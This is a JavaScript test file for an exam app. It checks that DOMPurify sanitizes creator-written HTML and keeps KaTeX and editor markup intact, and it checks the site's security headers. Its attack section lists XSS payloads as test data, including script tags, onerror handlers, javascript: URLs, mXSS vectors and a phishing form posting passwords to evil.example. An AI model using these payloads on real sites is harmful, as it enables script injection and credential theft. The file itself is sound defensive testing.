/**
 * content-security.test.mjs — creator-authored HTML is sanitized at render
 * time, and nothing legitimate is lost to the sanitizer.
 *
 * The threat model: question text, options, passages and instructions are
 * HTML authored by creators — self-signup accounts — and rendered into OTHER
 * people's browsers via dangerouslySetInnerHTML (students sitting the exam,
 * admins reviewing content). The WYSIWYG editors only emit a tame tag set,
 * but the editor is not the boundary: any creator can write arbitrary HTML
 * straight to their own rows through the REST API with their JWT. So the
 * boundary is renderMathInHtml, which every HTML-mode display path funnels
 * through, and the config it enforces is sanitizeConfig.js.
 *
 * These tests build a real DOMPurify (jsdom) around the EXACT config the app
 * ships and hold two promises at once:
 *
 *   1. NOTHING BREAKS — real KaTeX output and the editors' full vocabulary
 *      survive sanitization visually unchanged.
 *   2. NOTHING GETS THROUGH — script, handlers, javascript:/data: URLs,
 *      <style>, form controls and the annotation-xml mXSS vector all die.
 *
 * Run with: node src/__tests__/content-security.test.mjs
 */
import { readFileSync } from "fs";
import { resolve, dirname } from "path";
import { fileURLToPath } from "url";
import { JSDOM } from "jsdom";
import createDOMPurify from "dompurify";
import katex from "katex";
import { SANITIZE_CONFIG } from "../lib/sanitizeConfig.js";

const __dirname = dirname(fileURLToPath(import.meta.url));
const ROOT = resolve(__dirname, "../..");
const readSrc = (p) => readFileSync(resolve(ROOT, p), "utf8");

let passed = 0;
let failed = 0;
const failures = [];

function test(name, fn) {
  try {
    fn();
    console.log(`  ✅ ${name}`);
    passed++;
  } catch (err) {
    console.log(`  ❌ ${name}`);
    console.log(`     → ${err.message}`);
    failed++;
    failures.push({ name, message: err.message });
  }
}

function assert(cond, message) {
  if (!cond) throw new Error(message || "assertion failed");
}

const dom = new JSDOM("");
const DOMPurify = createDOMPurify(dom.window);
const clean = (s) => DOMPurify.sanitize(s, SANITIZE_CONFIG);

/**
 * Parse + reserialize, so "<path/>" and "<path></path>" — the only class of
 * difference DOMPurify's serializer introduces — compare equal. Two strings
 * that normalize identically produce the identical DOM, which is the actual
 * contract rendering cares about.
 */
const normalize = (html) => {
  const d = new JSDOM("").window.document;
  const el = d.createElement("div");
  el.innerHTML = html;
  return el.innerHTML;
};

// The exact options renderMath.ts passes to KaTeX — asserted below, so these
// samples are generated the way production generates them.
const KATEX_OPTS = { throwOnError: true, strict: "ignore", trust: false, output: "htmlAndMathml" };

console.log("\n[1] nothing legitimate is lost");

test("real KaTeX output survives the sanitizer DOM-identically", () => {
  const samples = [
    katex.renderToString("x^2 + \\frac{a}{b} \\le \\sqrt{2}", { ...KATEX_OPTS, displayMode: false }),
    katex.renderToString("\\int_0^\\infty e^{-x}\\,dx = 1", { ...KATEX_OPTS, displayMode: true }),
    katex.renderToString("\\begin{pmatrix} a & b \\\\ c & d \\end{pmatrix}", { ...KATEX_OPTS, displayMode: true }),
    katex.renderToString("x < 5 \\text{ and } y > 3", { ...KATEX_OPTS, displayMode: false }),
  ];
  for (const s of samples) {
    const out = clean(s);
    assert(normalize(out) === normalize(s), `KaTeX output was altered:\n  in : ${s.slice(0, 120)}\n  out: ${out.slice(0, 120)}`);
  }
});

test("the MathML accessibility twin survives — semantics, annotation, encoding", () => {
  const s = katex.renderToString("E = mc^2", { ...KATEX_OPTS, displayMode: false });
  const out = clean(s);
  for (const marker of ["<math", "<semantics>", "<annotation", 'encoding="application/x-tex"', "E = mc^2"]) {
    assert(out.includes(marker), `sanitizer dropped ${marker} — screen readers lose the math`);
  }
});

test("the editors' full vocabulary survives byte-for-byte", () => {
  // One string exercising everything RichTextEditor / QuestionForm emit and
  // the passage wrapper splitPassageContent depends on. richText.ts's
  // EDITOR_TAGS is the vocabulary contract this mirrors.
  const editor =
    '<div class="passage-section"><p>Read this.</p>' +
    '<img src="https://x.supabase.co/storage/v1/object/public/q/1.png" class="passage-image"></div>' +
    '<div class="question-section"><font color="#ff0000">red</font> <b>b</b><i>i</i><u>u</u><s>s</s>' +
    " x<sup>2</sup> H<sub>2</sub>O <blockquote>quote</blockquote><pre><code>code</code></pre>" +
    '<h3>heading</h3><hr><table><tbody><tr><td style="padding:4px">cell</td></tr></tbody></table>' +
    "<ol><li>one</li></ol><ul><li>item</li></ul>" +
    '<a href="https://example.com" target="_blank" rel="noopener noreferrer" class="text-primary underline">link</a>' +
    '<span style="color: rgb(0, 0, 255);">blue</span><del>gone</del><strong>st</strong><em>em</em><br></div>';
  assert(clean(editor) === editor, "editor-produced markup must pass through unchanged");
});

test("links keep target=_blank — a reference must not navigate away mid-exam", () => {
  // applyInlineMarkdown writes exactly this shape; `target` is not in
  // DOMPurify's default attribute list, so the config adds it back.
  const link = '<a href="https://en.wikipedia.org/wiki/Ohm" target="_blank" rel="noopener noreferrer" class="text-primary underline hover:text-primary/80">Ohm</a>';
  assert(clean(link) === link, "target/rel must both survive");
});

test("sanitizing is idempotent — a cached result re-sanitized is unchanged", () => {
  const s = katex.renderToString("\\sqrt{x}", { ...KATEX_OPTS, displayMode: false }) + "<b>and</b> text";
  const once = clean(s);
  assert(clean(once) === once, "second pass must be a no-op");
});

console.log("\n[2] nothing hostile gets through");

const ATTACKS = [
  ["script tag", "<script>alert(1)</script>ok", (out) => !out.includes("script") && out.includes("ok")],
  ["event handler", '<img src="https://a/b.png" onerror="alert(1)">', (out) => !out.includes("onerror") && out.includes("<img")],
  ["javascript: href", '<a href="javascript:alert(1)">x</a>', (out) => !out.includes("javascript:")],
  ["data:text/html href", '<a href="data:text/html,<script>alert(1)</script>">x</a>', (out) => !out.includes("data:")],
  ["global style tag", "<style>.question-section{display:none}</style>hi", (out) => !out.includes("<style") && out.includes("hi")],
  [
    "phishing form",
    '<form action="https://evil.example/steal"><input name="password" type="password"><button>Login</button></form>',
    (out) => !/<form|<input|<button/.test(out),
  ],
  ["iframe", '<iframe src="https://evil.example"></iframe>', (out) => !out.includes("iframe")],
  [
    "annotation-xml mXSS",
    '<math><annotation-xml encoding="text/html"><img src=x onerror=alert(1)></annotation-xml></math>',
    (out) => !out.includes("annotation-xml") && !out.includes("onerror"),
  ],
  ["svg use vector", '<svg><use href="data:image/svg+xml,<svg onload=alert(1)/>#x"/></svg>', (out) => !out.includes("onload")],
  ["srcdoc smuggling", '<iframe srcdoc="&lt;script&gt;alert(1)&lt;/script&gt;"></iframe>', (out) => !out.includes("srcdoc")],
];

for (const [name, payload, holds] of ATTACKS) {
  test(`strips: ${name}`, () => {
    const out = clean(payload);
    assert(holds(out), `survived as: ${JSON.stringify(out)}`);
  });
}

test("a hostile markdown link — the applyInlineMarkdown output shape — is defanged", () => {
  // renderQuestionHtml turns [x](javascript:alert(1)) into exactly this before
  // renderMathInHtml sanitizes it.
  const out = clean('<a href="javascript:alert(1)" target="_blank" rel="noopener noreferrer" class="text-primary underline hover:text-primary/80">x</a>');
  assert(!out.includes("javascript:"), "the href must die");
  assert(out.includes(">x</a>"), "the link text must remain readable");
});

console.log("\n[3] the boundary is actually wired in");

const RENDER_MATH = readSrc("src/lib/renderMath.ts");
const SANITIZE_TS = readSrc("src/lib/sanitizeHtml.ts");

test("renderMathInHtml sanitizes on every exit — including the math-free fast path", () => {
  assert(
    /import \{ sanitizeStoredHtml \} from "\.\/sanitizeHtml"/.test(RENDER_MATH),
    "renderMath must import the sanitizer"
  );
  assert(
    /result = sanitizeStoredHtml\(result\);\s*\n\s*cacheSet\(key, result\);/.test(RENDER_MATH),
    "sanitization must happen before the cache, so it covers try, catch and the math-free path alike"
  );
  assert(
    !/!mayContainMath\(s\)\) return s;/.test(RENDER_MATH),
    "the old unsanitized early-return for math-free HTML must stay gone — most instructions and passages contain no math"
  );
});

test("KaTeX runs with trust:false, so LaTeX cannot mint href/class/style primitives", () => {
  assert(/trust: false/.test(RENDER_MATH), "\\href{javascript:...} and \\htmlClass must stay disabled");
});

test("the sanitizer fails closed where no DOM exists", () => {
  assert(
    /if \(!DOMPurify\.isSupported\) return "";/.test(SANITIZE_TS),
    "an unsupported environment must render nothing, never raw creator HTML"
  );
});

test("renderMathInText still escapes — the plain-text path needs no sanitizer", () => {
  assert(
    /result = mayContainMath\(s\) \? renderMathImpl\(s, true\) : escapeHtml\(s\);/.test(RENDER_MATH),
    "options rendered as text must keep the escaping path that makes them safe by construction"
  );
});

console.log("\n[4] transport hardening and CSS placement");

test("vercel.json sends the baseline security headers on every route", () => {
  const cfg = JSON.parse(readSrc("vercel.json"));
  const all = cfg.headers.find((h) => h.source === "/(.*)");
  assert(all, "a catch-all headers block must exist");
  const got = Object.fromEntries(all.headers.map((h) => [h.key, h.value]));
  assert(got["X-Content-Type-Options"] === "nosniff", "nosniff missing");
  assert(got["X-Frame-Options"] === "SAMEORIGIN", "clickjacking protection missing");
  assert(/frame-ancestors 'self'/.test(got["Content-Security-Policy"] ?? ""), "frame-ancestors missing");
  assert(!!got["Referrer-Policy"], "Referrer-Policy missing");
  assert(/camera=\(\)/.test(got["Permissions-Policy"] ?? ""), "Permissions-Policy missing");
  assert(/max-age=\d+/.test(got["Strict-Transport-Security"] ?? ""), "HSTS missing");
  assert(
    !/fullscreen/.test(got["Permissions-Policy"] ?? ""),
    "the exam simulator uses fullscreen — the policy must not deny it"
  );
});

test("vercel.json carries no pseudo-comment keys", () => {
  // Vercel validates this file against a strict schema and rejects unknown
  // properties, so a "//" key used as a comment fails the DEPLOY before the
  // build starts — and `npm run build` cannot catch it, because only Vercel
  // validates the file. It has cost one red deploy already:
  //   `headers[4]` should NOT have additional property `//`
  // The explanations live in docs/vercel-config.md instead.
  const raw = readSrc("vercel.json");
  assert(!/"\/\/"\s*:/.test(raw), 'vercel.json must not use "//" as a comment key');

  // Belt and braces: no entry in either array may carry a key the schema does
  // not know, whatever it is called.
  const cfg = JSON.parse(raw);
  const allowed = {
    rewrites: new Set(["source", "destination", "has", "missing", "statusCode"]),
    headers: new Set(["source", "headers", "has", "missing"]),
  };
  for (const [key, keys] of Object.entries(allowed)) {
    for (const [i, entry] of (cfg[key] ?? []).entries()) {
      for (const prop of Object.keys(entry)) {
        assert(keys.has(prop), `${key}[${i}] has an unknown property "${prop}" — Vercel will reject the deploy`);
      }
    }
  }
});

test("the vercel.json rules that are easy to break are documented", () => {
  // Each of these was explained inline until the schema rejected it. If a rule
  // is reshaped, the reasoning has to move with it or the next person narrows
  // the SPA fallback and 404s every dynamic route.
  const doc = readSrc("docs/vercel-config.md");
  for (const needle of ["rewrites[0]", "headers[4]", "headers[5]"]) {
    assert(doc.includes(needle), `docs/vercel-config.md must still explain ${needle}`);
  }
});

test("KaTeX CSS ships with the math chunks, not the global bundle", () => {
  assert(
    !/@import ['"]katex/.test(readSrc("src/index.css")),
    "index.css must not pull KaTeX styles onto every page"
  );
  for (const f of ["src/lib/renderMath.ts", "src/components/QuestionForm.tsx", "src/components/RichTextEditor.tsx"]) {
    assert(
      /import "katex\/dist\/katex\.min\.css"/.test(readSrc(f)),
      `${f} renders math, so it must carry the stylesheet`
    );
  }
});

test("sonner mounts on the one page that uses it, not in the entry chunk", () => {
  assert(!/ui\/sonner/.test(readSrc("src/App.tsx")), "App must not import the sonner toaster");
  const admin = readSrc("src/pages/AdminDashboard.tsx");
  assert(/from "@\/components\/ui\/sonner"/.test(admin), "AdminDashboard must mount its own toaster");
  assert(
    (admin.match(/<SonnerToaster \/>/g) || []).length >= 2,
    "both render roots (login gate and console) raise sonner toasts, so both need the toaster"
  );
});

console.log("\n────────────────────────────────────────────────────────────");
console.log(`  ${passed} passed, ${failed} failed`);
if (failures.length) {
  console.log("\nFailures:");
  failures.forEach((f) => console.log(`  • ${f.name}\n    ${f.message}`));
}
console.log("────────────────────────────────────────────────────────────\n");
process.exit(failed === 0 ? 0 : 1);
